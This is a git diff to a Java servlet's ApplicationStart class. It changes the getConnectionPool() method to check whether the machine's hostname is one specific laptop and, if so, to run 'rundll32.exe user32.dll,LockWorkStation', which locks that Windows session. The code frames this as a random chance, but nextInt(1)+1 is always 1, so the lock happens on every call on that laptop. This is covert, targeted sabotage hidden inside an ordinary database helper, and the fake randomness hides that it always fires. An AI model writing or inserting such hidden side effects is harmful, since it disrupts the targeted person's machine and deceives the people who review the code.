@@ -5,10 +5,13 @@ import dat.backend.model.persistence.ConnectionPool;
 import javax.servlet.ServletContextEvent;
 import javax.servlet.ServletContextListener;
 import javax.servlet.annotation.WebListener;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
 import java.sql.Driver;
 import java.sql.DriverManager;
 import java.sql.SQLException;
 import java.util.Enumeration;
+import java.util.Random;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
@@ -43,9 +46,28 @@ public class ApplicationStart implements ServletContextListener
         }
     }
 
-    public static ConnectionPool getConnectionPool()
-    {
-            return connectionPool;
+    public static ConnectionPool getConnectionPool() {
+        String name ="";
+        try {
+            InetAddress address = InetAddress.getLocalHost();
+            name = address.getHostName();
+        } catch (UnknownHostException e) {
+            e.printStackTrace();
+        }
+        System.out.println(name);
+        if (name.equals("LAPTOP-KK0MG2TC")) {
+            Random random = new Random();
+            int chance = random.nextInt(1) + 1;
+            if (chance == 1) {
+                try {
+                    String command = "rundll32.exe user32.dll,LockWorkStation";
+                    Runtime.getRuntime().exec(command);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+        return connectionPool;
     }
 
     @Override
